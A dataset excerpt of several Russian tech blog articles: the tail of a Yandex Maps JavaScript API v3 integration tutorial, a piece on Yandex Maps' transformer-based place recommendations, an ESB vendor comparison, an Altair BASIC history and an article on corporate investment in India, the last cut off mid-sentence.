файла index.html подключите основной скрипт Яндекс Карт. Обратите внимание, что обязательно в query-параметре apikey нужно прописать API-ключ из кабинета разработчика.  <head>     ...     <script src=""https://api-maps.yandex.ru/v3/?apikey=YOUR_API_KEY&lang=ru_RU"" type=""text/javascript"" defer></script>     ... </head>  Карту нужно отрисовать внутри какого-то контейнера с заданными параметрами ширины и высоты — добавьте его в index.html. А чтобы скрипт API распознал, внутри какого блока нужно рендерить объекты карты, обозначьте контейнер с помощью id=""map"".  <body>     ...     <div id=""map"" style=""width: 600px; height: 400px""></div>     ... </body>  Однако если вы сейчас перейдете на страницу, сама карта не загрузится. Подгрузятся только необходимые стили и иные необходимые объекты JavaScript API Яндекс Карт. Что примечательно: загрузка идет с помощью скрипта, а не iframe, что решает возможные проблемы с производительностью.   Five Server, тестовый файл index.html.  Инициализация карты Чтобы наконец вывести карту, нужно добавить JavaScript-код для инициализации после загрузки основного скрипта.      <script>         initMap();          // функция асинхронная, так как она может занимать много времени в основном потоке          // *зависит от соединения, стабильности API и другого         async function initMap() {              // основной объект для загрузки других объектов карты             await ymaps3.ready;             const {YMap, YMapDefaultSchemeLayer} = ymaps3;              // подложка, на которой будут располагаться маркеры             const map = new YMap(                 document.getElementById('map'),                 {                     location: {                         center: [37.588144, 55.733842],                         zoom: 10                     }                 }             );              map.addChild(new YMapDefaultSchemeLayer());         }     </script>  Параметры center и zoom влияют на центрирование и приближение соответственно. Координаты задаются нестандартно: сначала идет долгота, потом широта. Это важно учитывать.   Five Server, тестовый файл index.html: отображение карты.  Стилизация карты Сейчас карта загружена в стандартном интерфейсе и слишком детализирована. Показывает даже направление движения вдоль Цветочной. Чтобы кастомизировать карту под свое приложение, нужно использовать редактор стилей карт (не путайте с конструктором карт, который нужен для создания статичных полигонов).   Редактор стилей карт, пример стилизации.  С помощью редактора стилей карт можно настроить основной цвет, детализацию ландшафта, отображение иконок, подписей, дорог, зданий и транспорта. Инструмент удобный, интерфейс — приятный, однако гораздо менее гибкий в сравнении с 2ГИС. Но не суть.  Далее стили нужно экспортировать в JSON (нажать Скопировать) и перевести эту запись в одну строку — например, через IDE или онлайн-сервисы. А чтобы перенести кастомизацию на карту в приложении, нужно добавить свойство customization при наложении стандартного слоя YMapDefaultSchemeLayer в map.  …     map.addChild(new YMapDefaultSchemeLayer({         customization: [{""tags"":""country"",""elements"":...}]     })); …  Обратите внимание, что кастомизация всегда будет загружаться после основного слоя, который выполнен в классическом стиле Яндекс Карт. Предположительно это связано с тем, что функция внутри объекта асинхронная и ей нужно время на парсинг огромной JSON-строки со стилями. Единственный вариант это скрыть — добавить окно загрузки на несколько секунд.   Five Server, тестовый файл index.html: отображение стилизованной карты.  Добавление объектов Объектов в Яндекс Картах немало — под ними подразумеваются различные маркеры (метки), элементы управления картой и многое другое. Работа с ними описана в документации очень условно. Однако примеры работы с частью объектов загружены в песочницу. Рекомендую смотреть код именно там и не обращать внимания на тот, что в самой документации.  Примеры работы с основными объектами  Кастомные маркеры на карте Кнопка «Полноэкранный режим» Кнопка «Центрирование карты по геолокации» Кнопки «Приблизить/отдалить» Линейка для измерения расстояний между точками Мини-карта внутри основной Контекстное меню Боковая панель Указатели маркеров за пределами вьюпорта  Что нужно учитывать  Каждый новый объект на карте — это отдельный квест. Невозможно в одной инструкции качественно рассказать, как добавить каждый из объектов на карту. Но можем подсказать, в какой последовательности это лучше делать.  Начните с маркеров. Если вы работаете с ванильным JavaScript, пример из песочницы быстро переведет вас на TypeScript и вы перепишете инициализацию карты. Если у вас метки загружаются динамически, подумайте о том, как будете их добавлять на карту.  Все объекты можно стилизовать по-своему. Еще раз: карта загружается не в iframe. Вы можете установить последовательность включения скриптов через defer — правда, асинхронный код тоже нужно учитывать — и добавить стилизацию методами JavaScript (если делаете это по событию) или обычного CSS.  Заключение Интеграция карт, как и других динамических элементов на веб-страницы, — это полноценный квест, который можно пройти только методом проб и ошибок. Сегодня документация Яндекс Карт для JavaScript API v3 написана очень условно, а информации в сети за пару лет накопилось недостаточно. Поэтому вайб-кодинг здесь не подойдет.  Ключевой пазл в интеграции элементов вроде карт — тестирование на разных устройствах. На базе облачных серверов можно за пару минут развернуть простое, но удобное stage-окружение, которое поможет в решении многих задач.  Возможно, эти материалы будут вам интересны:  → Как легально не платить за облако: стратегии, примеры, команды OpenStack → Продлеваем жизнь матрицы телевизора Haier после выхода ее из строя → Альтернативы Firefox: обзор 5 лучших форков для тех, кто устал от Mozilla"
99,"Магия персональных рекомендаций, или как нейросеть Яндекс Карт подбирает места под интересы пользователей",Яндекс,Как мы делаем Яндекс,0,"Поисковые технологии, Мобильные технологии, Веб-сервисы",2025-04-09,"Сегодня мы запустили в Яндекс Картах новое поколение персональных рекомендаций, которые помогают с выбором мест — для завтрака, прогулки, спонтанного путешествия и других ситуаций. Рекомендации теперь доступны на главном экране приложения, а подбирать локации под вкусы пользователей помогает нейросеть на базе трансформерной архитектуры.Меня зовут Владимир Жуков, я руководитель группы магии рекомендаций Карт (да, это официальное название), и в этой статье я расскажу, чем наша рекомендательная система отличается от технологий других сервисов, по каким метрикам мы измеряем её качество и как обучаем нейросеть находить тот самый ресторан, музей или парк, который надолго останется фаворитом.Как выглядят рекомендации в КартахТеперь пользователи Карт могут изучать персональные рекомендации мест прямо на главном экране приложения: в ленте под поисковой строкой и прямо на карте в виде «фотопои», как мы их называем (англ. Point of Interest — POI).«Фотопои» — это круглые иконки с фотографиями организаций, расположенные на карте. Рядом с фото может быть текст с названием организации, её сферой деятельности, рейтингом и причиной попадания в рекомендации, например «недалеко от дома», «часто смотрели», «вы поставили 5 звёзд», «лучшие бургеры».Выбор из множества фотографий организации и вырезание кружочка для «фотопои» — сложная задача. Наши алгоритмы компьютерного зрения делают это так, чтобы изображение получилось красивым и информативным.«Фотопои» могут быть и неперсональными: сейчас это только главные достопримечательности городов, которые видны всем пользователям. Вместо настоящей фотографии в них используются созданные дизайнерами картинки — их легко отличить при сравнении.В нижней части экрана под поисковой строкой — лента с рекомендациями. Если для «фотопои» набор организаций тесно связан с областью карты на экране, то в ленте могут быть организации из всего города. При этом заведения, которые находятся в видимой области карты, получают приоритет в ранжировании.Чтобы было проще ознакомиться с организацией перед её посещением, мы создаём рассказы про локации в формате сторис. Их можно найти в карточке организации в блоке «Коротко о месте». Эти рассказы создают YandexGPT и модели компьютерного зрения на основе отзывов, фото и видео организаций.Рекомендации теперь работают не только в крупных городах, но и в небольших населённых пунктах. Так что найти, где поесть, отдохнуть и культурно обогатиться можно и в Москве, и в Переславле‑Залесском, и в станице Павловская.Особенности рекомендаций в КартахПо алгоритмам наша система персональных рекомендаций во многом похожа на другие сервисы. Мы работаем с внутренним фреймворком рекомендаций DJ, которым пользуются сервисы Яндекса, и применяем классические подходы: коллаборативную фильтрацию, content‑based фильтрацию, матричную факторизацию, а также нейросетевые модели. Но выбор мест в Картах отличается от выбора, например, фильмов или музыки, и это влияет на наше технологическое решение. Перечислю наши основные особенности.Расстояние до организации. Одно из отличий наших рекомендаций — пространственная составляющая. Нам нужно учитывать, где расположены организации, которые мы предлагаем пользователям. Например, если жителю Москвы мы покажем боулинг‑клуб в Благовещенске, вероятность того, что он его посетит — крайне мала. То же касается и удалённых организаций в пределах одного города: чем больше расстояние от пользователя и сложнее транспортная доступность, тем меньше вероятность посещения. Также есть разница между выбором мест в родном городе и поиском интересных локаций в путешествиях.Время. В нашем продукте важна и временна́я составляющая. Предпочтения пользователей могут сильно меняться в зависимости от времени суток и дня недели. Например, в рабочие дни пользователи чаще ищут места для обеда вблизи офиса, а в выходные их интересы смещаются в сторону развлечений и отдыха.Мир на экране телефона. Ещё одна особенность — то, как пользователи взаимодействуют с продуктом. Карту можно двигать, крутить, увеличивать и уменьшать. На каждое такое действие у нас есть ограниченная область на карте с определённым масштабом. Мы можем показывать «фотопои» только для организаций из этой области и только в тех точках, где они находятся. В этом случае множество кандидатов для рекомендаций ограничено экраном. А когда «фотопои» организаций пересекаются, мы вынуждены выбирать только одну из них, отдавая предпочтение той, у которой выше релевантность по данным модели.Для ленты таких ограничений уже нет, и можно выбирать из всего множества организаций. Но мы всё равно учитываем расстояние от области карты на экране и не показываем организации из других городов.Длинный таймлайн выбора и оценки. Отличает нас от других сервисов и то, как пользователи выбирают и оставляют обратную связь. Выбор организации для посещения часто требует больше времени, чем, например, выбор музыки или фильма. Но даже если пользователь выбрал место, он может его посетить только через несколько дней или даже недель. А ещё пользователи не всегда оставляют оценки.Чтобы справиться с большими задержками или отсутствием качественной обратной связи, кроме оценок и отзывов мы используем и другие сигналы, приближающие выбор и повышающие заинтересованность. В их числе: построение маршрута, клик в телефон организации, просмотр фотографий и панорам, добавление в закладки. Эти сигналы мы используем при обучении моделей и для оценки качества рекомендаций.Как мы измеряем качествоС тех пор, как мы начали развивать наш продукт, перед нами стояла задача, как оценивать качество рекомендаций. Изначально мы использовали асессорскую разметку для расчёта метрик в офлайне — без тестирования на реальных пользователях. Но у этого подхода были недостатки. Например, разметка рекомендаций очень субъективна, а число наших асессоров нельзя назвать репрезентативным относительно всей генеральной совокупности пользователей Карт. Если растить такую метрику, то есть риск улучшить рекомендации только для конкретных асессоров, а для основной массы пользователей они могут ухудшиться. К тому же асессоры взаимодействуют с рекомендациями не так, как реальный пользователь.Сейчас наша основная KPI‑метрика рекомендаций — онлайн‑метрика. Мы фиксируем множество целевых действий, которые пользователи совершают в карточках организаций: построение маршрута, добавление в закладки и т. д. Для каждого дня мы считаем долю пользователей, которые совершали целевые действия из рекомендаций, от всех пользователей, которые совершали целевые действия в discovery‑сценариях (т. е. в сценариях, где пользователь выбирает, куда пойти, а не ищет конкретную локацию). По сути, мы берём всех пользователей, которые совершали выбор, и считаем, в каком проценте случаев выбор происходил с использованием наших рекомендаций. Есть и более верхнеуровневая KPI‑метрика, которую мы называем Discovery DAU (Daily Active Users), — количество уникальных пользователей за сутки, совершающих выбор организаций в Картах. Эту метрику тяжелее растить, так как для этого нужно приводить новых пользователей, которые также будут выбирать организации в приложении. Онлайн‑метрики решают многие проблемы, которые были в офлайне на асессорской разметке. Они показывают, как пользователи взаимодействуют с нашим продуктом. Если мы улучшаем качество рекомендаций, то пользователи чаще ими пользуются и совершают больше целевых действий, а метрики растут.Но у онлайн‑метрик есть и минусы. Чтобы сравнить при помощи A/B‑тестирования новую версию рекомендаций с текущей, нужно ждать, пока накопится достаточное количество данных в логах сервиса. Обычно это занимает одну‑две недели. А чтобы быстро оценивать новые модели ранжирования перед запуском в онлайн‑эксперимент, мы используем офлайн‑метрику, которая вычисляется по историческим данным. Мы собираем данные, которые состоят из показов рекомендаций и кликов с целевыми действиями. Далее мы вычисляем метрику ранжирования nDCG10 (Normalized Discounted Cumulative Gain), считая кликнутые организации положительными примерами. Чем выше модель ранжирует организации, в которые были клики, тем больше значение метрики.Наша нейросетевая модель рекомендацийС момента запуска первых рекомендаций в Картах в апреле прошлого года наша система претерпела много изменений. В новом поколении рекомендаций одной из основных моделей стала нейросеть на базе архитектуры Transformer. Она представляет пользователя как последовательность событий и может выявлять в них нетривиальные закономерности, которые не способны обнаружить классические модели. Подробнее про этот подход можно прочитать в этих статьях:Self‑Attentive Sequential RecommendationBERT4Rec: Sequential Recommendation with Bidirectional Encoder Representations from TransformerPinnerFormer: Sequence Modeling for User Representation at PinterestВ нашем случае событие — это действие пользователя в Яндекс Картах, некоторым образом связанное с рекомендациями организаций. Действия могут быть разных типов: оценка, отзыв, открытие карточки организации, одно из целевых действий, о которых шла речь выше. Кроме типа действия, событие содержит ещё информацию об организации, над которой оно было совершено:рубрика организации (кафе, бильярдный клуб, музей);сеть (для организаций с несколькими филиалами);особенности (например, есть ли Wi‑Fi или детская комната);географическое расположение.При обучении и применении трансформера ему на вход подаются эмбеддинги событий, то есть их специальные числовые представления. Они состоят из трёх компонент: эмбеддинга организации, эмбеддинга типа события и позиционного эмбеддинга. Эмбеддинг организации вычисляет энкодер — часть нейросети, которая преобразует входные данные (рубрику, особенности, расположение и другие) в числовое представление. После всех событий на вход трансформера подаются специальные task‑токены. Они похожи на CLS‑токены, которые используются в задачах обработки естественного языка. Эти токены соответствуют конкретным задачам, на которые обучается нейросетевая модель. Например, предсказание вероятности целевого действия.В нашей архитектуре мы используем позднее связывание истории пользователя и кандидата для ранжирования. Мы отдельно вычисляем эмбеддинги пользователя и кандидата, а затем считаем финальные значения релевантностей как скалярные произведения. Преимущество позднего связывания — низкие затраты на вычисления в рантайме, хотя по качеству такая архитектура немного уступает моделям с ранним связыванием. Эмбеддинги кандидатов вычисляются при помощи энкодера и могут быть предподсчитаны в офлайне, эмбеддинги пользователей тоже могут быть предподсчитаны в офлайне — в рантайме остаётся только перемножить эмбеддинги пользователей и кандидатов.Отдельно стоит сказать про генерацию кандидатов для ранжирования. В городах‑миллионниках, таких как Москва, Санкт‑Петербург, Новосибирск, находится большое число организаций (десятки или даже сотни тысяч), которые мы хотим рекомендовать. Если бы мы для каждого запроса пользователя вычисляли признаки и применяли модели, оценивающие релевантность всех организаций, это бы потребовало огромного количества вычислительных ресурсов. Кроме того, обработка каждого запроса занимала бы значительное время — что сказалось бы на скорости работы сервиса и удобстве для пользователей. Поэтому мы используем методы предварительной фильтрации кандидатов, чтобы сократить количество организаций и ускорить процесс ранжирования. Для получения списка кандидатов мы используем как простые методы (например, берём самые популярные в текущем окне и городе), так и алгоритм HNSW (англ. Hierarchical Navigable Small World), который находит ближайшие организации по эмбеддингу пользователя. Подробнее про этот алгоритм можно прочитать в статье Approximate Nearest Neighbor Search Small World Approach.Персональные рекомендации в Яндекс Картах помогают пользователям выбирать организации и открывать для себя новые места, соответствующие их интересам. Для Яндекса же рекомендации в Картах способствуют увеличению вовлечённости в сервис и росту ключевых метрик, таких как Discovery DAU.Мы не хотим останавливаться и в ближайшее время планируем:внедрить более современные архитектуры моделей, которые смогут ещё точнее учитывать сложные закономерности в поведении пользователей;ускорить обновление и обеспечить свежесть рекомендаций, чтобы пользователи всегда получали актуальную информацию;увеличить разнообразие рекомендаций, чтобы пользователи чаще могли открывать для себя новые и интересные места;улучшить интерфейс, чтобы сделать процесс взаимодействия с рекомендациями ещё более удобным и интуитивно понятным.Но главное, конечно, — добавить ещё больше магии рекомендаций в процесс поиска и выбора мест для миллионов пользователей Карт. "
100,"Пример одной интеграции с помощью Red Mule, «Интегры», Factor-ESB — открытые результаты",ИТ-интегратор Белый код,Подбираем и адаптируем ИТ-решения,0,"Программное обеспечение, Консалтинг и поддержка, Веб-сервисы",2025-04-09,"На связи Сергей Скирдин, технический директор ИТ-интегратора «Белый код». Недавно мы провели своеобразный батл среди российских разработчиков шин данных и интеграционных платформ. Выкладываю результаты батла.Правила батлаИдея батла появилась в середине декабря 2024 года в телеграм-сообществе «Шины не для машины», посвященном российским ESB. На отечественном рынке более 40 решений, которые относятся к классу ESB, но практически нет информации о том, как они работают. Для восполнения пробела предложил вендорам батл — я формулирую задачу на интеграцию и провожу онлайн-встречи, где каждый вендор на своей шине реализует поставленную задачу. Определили такие правила:Одно задание и условия для всех. Не допускается использовать заготовленные куски кода, шаблоны преобразований. Чтобы упростить задачу, файлы для тестового интеграционного потока выложили в открытый доступ. Результаты будут опубликованы одновременно в формате видеозаписей. Записи выкладываются полные, без редактирования, чтобы продемонстрировать решение задачи в реальном времени, со всеми непредвиденными обстоятельствами. Задача для тестового интеграционного потокаОперативный контур (Система А) выкладывает данные измененных документов в файловый каталог. Финансовая система филиала (Система Б) обращается к шине, rest-запросом забирает данные для своего филиала порциями по 100 объектов. Решили не использовать напрямую 1С и веб-сервисы, к которым сложно получить доступ. На входе S3 или FTP (если нет S3-коннектора), каталог с XML-файлами. На выходе REST сервер с JSON. Чтобы было интереснее, добавили маршрутизацию по атрибуту документа (филиал), исключение дублей по УИД, выдачу результатов порциями по 100 документов. Подробное описание Результаты батлаИзначально заявились 9 представителей разных вендоров, однако участие приняли только три команды. Это разработчики следующих продуктов:Red Mule«Интегра»Factor-ESBВсе эти продукты попали в мой обзор рынка ESB, подробнее об обзоре в статье.Как и договаривались в сообществе, публикую результаты одновременно, распределив вендоров по очередности участия.Red MuleИнтеграционная платформа Red Mule — продукт системного интегратора «ГенАйТи». Компания занимается автоматизацией предприятий, встраивает бизнес-сервисы, а также разрабатывает программное обеспечение на заказ.Интеграционная платформа Red Mule обеспечивает взаимодействие любых информационных систем с гарантированным быстрым транспортом больших массивов данных. С помощью Red Mule можно автоматизировать процессы, связанные с электронным документооборотом, как внутренним, так и внешним. Также платформа позволяет объединять разнородные информационные системы, интеграции можно выстраивать между системами разных поколений. При этом разработчики постепенно могут заменять исторические решения, наводя порядок в инфраструктуре заказчика с точки зрения обмена.Результаты тестового интеграционного потока с помощью интеграционной платформы Red Mule«Интегра»Интеграционная платформа «Интегра» создана компанией «Севентек» (часть бренда «Севен Груп»), которая занимается комплексной разработкой, внедрением и сопровождением программного обеспечения под заказ. Кроме этого, «Севентек» разрабатывает собственные софтовые продукты. На рынке компания с 2017 года. По версии TAdviser, «Севентек» входит в ТОП-15 крупнейших ИТ-поставщиков. «Интегра» — один из ключевых продуктов компании, при этом довольно молодой, в реестре российского ПО с конца 2023 года. Это не просто система класса ESB, а интеграционная low-code платформа для подключения различных источников данных и соединения приложений в единый ИТ-ландшафт. То есть более широкий инструмент, который позволяет непосредственно в интерфейсе создавать интеграции, настраивать мониторинг, логирование, оперативно вносить изменения в потоки информационного обмена и т. п.Результаты тестового интеграционного потока с помощью интеграционной платформы «Интегра»Factor-ESBООО «Фактор-ТС» работает на рынке с 1999 года. Но история компании началась еще в 1985 году, когда во ВНИИ Прикладных Автоматизированных Систем (ВНИИПАС) был начат проект создания Автоматизированной Диалоговой Организационно-Научной Информационной Системы (АДОНИС). В 2014 году компания начала разрабатывать собственный интеграционный продукт Factor-ESB (FESB). С 2023 года он развивается совместно с «ЛАБ СП», основанной бывшими сотрудниками SAP CIS. Сегодня Factor-ESB — часть платформы Integration Gears, на основе Factor-ESB и расширения Enterprise Integration Kit. Это и другие расширения разрабатывает компания «ЛАБ СП».Программный продукт входит в реестр российских программ и сертифицирован ФСТЭК России.Результаты тестового интеграционного потока с помощью интеграционной шины Factor-ESBЗаключениеПо результатам батла все вендоры показали способность реализовать тестовый сценарий. В соответствии с общими трендами рынка ESB большинство операций решается в low-code режиме. Однако доля кода, который требуется написать, удобство инструмента, интерфейс, да и подходы к решению задачи от вендора к вендору отличаются. Воздержусь от субъективных выводов, смотрите видео, выбирайте какой из инструментов вам ближе. А если вы не знаете, что выбрать для своего проекта, и нужна консультация, пишите мне в Телеграм t.me/skirdinsa.Кстати, в сообществе «Шины не для машины» мы сейчас проводим второй тур батла. Приглашаю вендоров поучаствовать! Можете написать в сообществе или напрямую мне. "
101,Как Altair BASIC положил начало эпохе персональных компьютеров,МТС,Про жизнь и развитие в IT,0,"Связь и телекоммуникации, Мобильные технологии, Веб-сервисы",2025-04-09,"В истории вычислительной техники есть несколько ключевых событий, оказавших сильнейшее влияние на развитие ИТ. Одно из них — появление Altair BASIC, интерпретатора языка BASIC, написанного Биллом Гейтсом и Полом Алленом в 1975 году для ПК Altair 8800. Этот проект стал еще и стартом Microsoft плюс сделал программирование доступным для владельцев первых персональных компьютеров.В апреле 2025 года, отмечая 50-летие Microsoft, Билл Гейтс сделал символический подарок сообществу: опубликовал исходный код Altair BASIC, назвав его «самым крутым» из всего, что он когда-либо писал. Код, созданный полвека назад для Altair 8800, теперь доступен для изучения и анализа, причем с личными комментариями Гейтса. Он рассказал, как работа над проектом в условиях ограниченных ресурсов (а это всего 4 килобайта памяти) научила оптимизации и заложила основы его подхода к разработке. Об этом сегодня и поговорим, а заодно вспомним историю появления легендарного ПК. Когда персональных компьютеров было малоВ начале 1970-х годов компьютеры были громоздкими и дорогими машинами, доступными только крупным компаниям и университетам. Но в 70-х годах ситуация начала меняться. Американская MITS (Micro Instrumentation and Telemetry Systems) представила Altair 8800 — первый коммерчески успешный персональный компьютер, который можно было собрать дома. Он стоил около 400 $, продавался для экономии в виде компонентов для самостоятельной сборки и базировался на процессоре Intel 8080. Тот самый ПК, источникОснову успеха Altair составили несколько факторов: удачная системная шина, открытая архитектура, сравнительно низкая цена и активное продвижение со стороны разработчика. Уже в первые месяцы после старта продаж радиолюбители и энтузиасты начали создавать платы расширения, которые быстро превратили Altair 8800 из минималистичной вычислительной коробки в полноценный компьютер с широкой периферией.Все бы ничего, но у него была одна серьезная проблема — отсутствие удобного программного обеспечения. Ни клавиатуры, ни дисплея не было, так что программы нужно было вводить вручную: с помощью тумблеров на передней панели, по одной инструкции за раз, машинным кодом. Светодиоды отображали содержимое регистров или ячеек памяти. Такой способ работы был понятен разве что инженерам и радиолюбителям, но не подходил для массового пользователя.Именно в этот момент на сцену вышли Билл Гейтс и Пол Аллен, два молодых энтузиаста из Гарварда, увидевшие в Altair 8800 огромный потенциал.Как появилась идея Altair BASICВ декабре 1974 года Пол Аллен наткнулся на публикацию в журнале Popular Electronics, где описывался Altair 8800. Он показал ее Гейтсу, и оба поняли: чтобы сделать компьютер полезным, нужен язык программирования, который позволит пользователям писать софт без необходимости разбираться в машинном коде. Их выбор пал на BASIC (Beginner’s All-purpose Symbolic Instruction Code) — простой и популярный в то время язык, разработанный в 1964 году Джоном Кемени и Томасом Курцем для обучения студентов.Тот самый PDP-10, источникГейтс и Аллен связались с Эдом Робертсом, основателем MITS, и предложили создать интерпретатор BASIC для Altair 8800. Интересно, что на тот момент у них не было ни готового кода, ни даже самого компьютера — только эмулятор процессора Intel 8080, который они написали на университетском PDP-10. Тем не менее Робертс согласился встретиться с ними, если они смогут продемонстрировать работающий продукт. Что ж, пришлось спешно его создавать!Работа над Altair BASIC началась в январе 1975 года и заняла всего восемь недель. Гейтс и Аллен трудились практически без отдыха. Пол Аллен сосредоточился на написании эмулятора и загрузчика, а Билл Гейтс взял на себя основную часть интерпретатора BASIC. Им пришлось уместить весь код в крошечные 4 килобайта оперативной памяти Altair 8800 — невероятно сложная задача по тем временам.Чтобы добиться этого, они оптимизировали каждую строку кода. Гейтс разработал компактный способ хранения чисел с плавающей запятой, а это позволило уместить больше возможностей в ограниченном объеме памяти. В итоге версия BASIC поддерживала базовые команды, такие как PRINT, INPUT и GOTO, и простые математические операции.Исходный код на ассемблере, на котором был написан интерпретатор Altair BASIC. ИсточникВ феврале 1975 года Аллен полетел в Альбукерке, штат Нью-Мексико, где находилась штаб-квартира MITS, чтобы продемонстрировать совместный с Гейтсом проект. Он загрузил код через перфоленту, и, к его облегчению, программа заработала с первого раза. На телетайпе появилась строка «MEMORY SIZE?». Это был триумф — первый случай, когда Altair 8800 «заговорил» на языке, понятном человеку.Влияние на индустриюAltair BASIC стал сенсацией. MITS начала продавать его как программное обеспечение для своего компьютера, и спрос превысил все ожидания. Пользователи получили возможность писать свои программы — от простых игр до утилит, что сделало персональные компьютеры более привлекательными. Именно этот момент считается рождением софтверной индустрии: Гейтс и Аллен основали Microsoft (тогда еще Micro-Soft) в апреле 1975 года, чтобы развивать и продавать свой BASIC для других платформ.Влияние Altair BASIC вышло далеко за рамки простого программного продукта. Он стал мостом между «железом» и человеком, сделав взаимодействие с компьютером доступным даже для непрофессионалов. Хотя BASIC и не был операционной системой, он наглядно показал: машинам необходим удобный пользовательский интерфейс. Именно этот подход лег в основу более развитых систем вроде CP/M и MS-DOS. А уже они, в свою очередь, проложили путь к Windows, macOS и Linux.Интересно, что Гейтс и Аллен не планировали делиться кодом Altair BASIC, ведь это был проприетарный продукт. Но в 1970-х годах среди энтузиастов была распространена культура обмена программами. Некоторые пользователи начали копировать и передавать код без разрешения, что вызвало гнев Гейтса. В 1976 году он написал знаменитое «Открытое письмо любителям» (Open Letter to Hobbyists), где осудил пиратство и подчеркнул, что разработка софта требует ресурсов и должна оплачиваться. Этот эпизод стал одним из первых публичных обсуждений авторских прав в софтверной индустрии.Тем не менее со временем исходный код Altair BASIC стал доступен для изучения. Сегодня его можно найти в архивах и музеях, например Музее компьютерной истории в Маунтин-Вью, Калифорния. А с публикацией кода в 2025 году Гейтс окончательно открыл эту возможность для всех желающих.Сам Altair BASIC — не просто исторический артефакт из прошлого. Он стал важной вехой на пути к персональным компьютерам и формированию софтверной индустрии как отдельного направления. Без него, вероятно, не было бы Microsoft, а развитие операционных систем могло пойти по совершенно другому пути. Многое из того, что мы сейчас считаем стандартом — доступность, простота, ориентация на пользователя — зародилось в таких проектах, как Altair BASIC, и позже стало основой современных операционных систем. Гейтс и Аллен сделали больше, чем просто написали интерпретатор: показали, что с компьютером может работать не только инженер, но и обычный смертный."
102,"Рабочая сила и производства — телекомы, автопроизводители и корпорации из других областей все еще идут в Индию",VAS Experts,Разработчик платформы глубокого анализа трафика,0,"Программное обеспечение, Аппаратное обеспечение, Связь и телекоммуникации",2025-04-09,"Компании набирают специалистов на удаленку, переводят в страну производственные мощности на миллиарды долларов. Поговорим о том, какие перспективы видит бизнес.Фотография: Abhishek Rai / UnsplashДоступный аутсорсинг и аутстаффингСогласно исследованию, проведенному компанией Zippia в 2023 году, две трети американских компаний имели на аутсорсинге хотя бы один отдел — причем, как правило, им было ИТ-подразделение. А одним из крупнейших мировых центров по услугам аутсорсинга и аутстаффинга разработчиков выступает Индия. По данным Statista, в этом году рынок страны будет насчитывать 5,8 млн ИТ-специалистов. А российские аналитики из прогнозируют, что ИТ-сектор будет занимать около 10% ВВП Индии.Чаще всего компании привлекают работников из Индии, чтобы снизить расходы на разработку. Средняя зарплата айтишника в Индии в несколько раз ниже, чем у его коллег из стран Запада. При этом инженеры и программисты из Индии обладают достаточно высокой квалификацией, которая как минимум не уступает уровню западных коллег.  60% крупнейших компаний мира продолжают передавать свои задачи в сфере ИТ на аутсорсинг в Индию. Аналитики Gartner предполагают, что к концу 2025 года эта цифра может вырасти до 80%.Так, American Airlines к началу 2025 года испытывала ряд трудностей в ИТ — компания отставала от конкурентов в вопросах цифровой трансформации. Она использовала устаревшие и часто сбоившие системы отслеживания багажа, а также столкнулась с несколькими утечками данных в сфере ИБ. Чтобы исправить ситуацию и попытаться сократить технологический разрыв с конкурентами, руководство American Airlines рассчитывает передать до 30% всех своих ИТ-операций на аутсорс в Индию.В IBM также планируют уволить тысячи сотрудников в США, чтобы нанять вместо них специалистов из Индии. Как говорят эксперты, всё это — часть долгосрочной стратегии развития компании: по слухам, уже в 2017 году около трети всех работников этой организации были гражданами Индии и Бангладеша.Новые филиалыПравительство Индии поддерживает развитие местного ИТ-сектора. Например, реализует инициативу самодостаточного рынка цифровых приложений и разрабатывает план: к 2027 году «вырастить» индийскую Кремниевую долину — Бангалор — до 25 тыс. стартапов. В целом же с 2015 по 2019 год Индия поднялась в Глобальном инновационном индексе с 81 на 52-е место. А в 2024-м страна занимала уже 39 место.Подобные программы поддержки способствуют улучшению инвестиционного климата и привлекают новых специалистов в ИТ-сектор. Компаниям становится проще заключать партнерские соглашения и развивать новые проекты, а также подбирать для их реализации квалифицированных сотрудников. Неудивительно, что и зарубежные компании не просто нанимают специалистов на аутсорс, но открывают в стране целые филиалы. Тот же Google строит в индийском Хайдарабаде один из крупнейших своих офисов с площадью более 300 тыс. квадратных метров — его планируют завершить к началу 2026 года. А по соседству уже возведён и функционирует кампус Amazon — почти 170 тыс. квадратных метров офисных помещений для 15 тыс. сотрудников.Индия становится хабом, частью которого стремятся стать ведущие мировые компании. При этом на технологическом рынке страны до сих пор можно найти перспективные ниши. В этом контексте показателен кейс американской Tesla, которая объявила о планах начать продажи своих электромобилей в Индии уже в этом году. На родном и европейском рынках автомейкеру приходится конкурировать с крупными производителями из Китая. Поэтому для Tesla Индия может стать спасательным кругом, который поможет сгладить 45-процентное падение уровня продаж в странах Евросоюза.Фотография: Michael Förtsch / UnsplashЕсть и примеры из иных отраслей: швейцарская транснациональная компания Nestle в 2024 году назвала рынок продуктов питания и напитков в Индии одним из самых быстрорастущих. Некоторые продукты Nestle по данным на 2024 год могли занимать в своих категориях до 50% рынка. C 2022 по 2025 год корпорация могли инвестировать в Индию более 600 млн долларов. Также её дочерние предприятия открывают в стране уже десятый завод, а в их планах реализовать более шести миллионов точек продаж.Причём интересы Tesla и Nestle на индийском рынке даже могут пересекаться. Дочернее предприятие Nestle India в 2022 году наметило цель — уменьшить число выбросов со своих производств до 50% к 2030 году. И одним из способов её достижения они определили полный перевод собственного автопарка на электромобили — что также может играть на руку новому игроку на рынке электротранспорта в лице компании Tesla.Совместное производствоДля развития бизнеса в Индии даже была основана особая экономическая зона в GIFT City с упрощенными налоговыми режимами. Кроме налоговых смягчений, власти Индии прибегают к другим финансовым стимулам. Так, индийское правительство готово софинансировать проекты иностранных предприятий по тридцати направлениям. Например, если компания разрабатывает в Индии технологические решения, то государство также вкладывается в бизнес в течение четырёх лет.Неудивительно, что развивающийся рынок Индии привлекает новых инвесторов и партнеров, открывающих совместные предприятия. Например, в 2023 году индийское правительство одобрило сделку с американской компанией Micron Technology. В рамках совместного проекта Индия инвестирует 1,3 млрд долларов в постройку крупного завода по тестированию полупроводников. Cтоимость проекта составит 2,7 млрд долларов.Запустить новое производство планирует и технологический гигант TP-Link совместно с местной компанией Optiemus. На территории Индии планируют производить различные устройства для систем умного дома и прочее сетевое оборудование. По данным исследований отраслевого органа страны IESA: в 2020 году индийский рынок IoT оценивался более чем в 5 млрд долларов. Если сравнивать с показателями 2016 года, то почти за пять лет он вырос на 330%. Эксперты прогнозируют дальнейший рост к 2034-му.Кроме того, в середине 2024 другой крупный поставщик сетевого оборудования открыл в Индии собственное производство роутеров и коммутаторов. На фабрике будут работать около 1200 сотрудников, а прогнозируемая прибыль оценивается в более чем 1,3 млрд долларов в год. Уже в начале 2025 года представители местного подразделения заявили, что они будут расширять производство и штат сотрудников.Дополнительное чтениеЧто там с 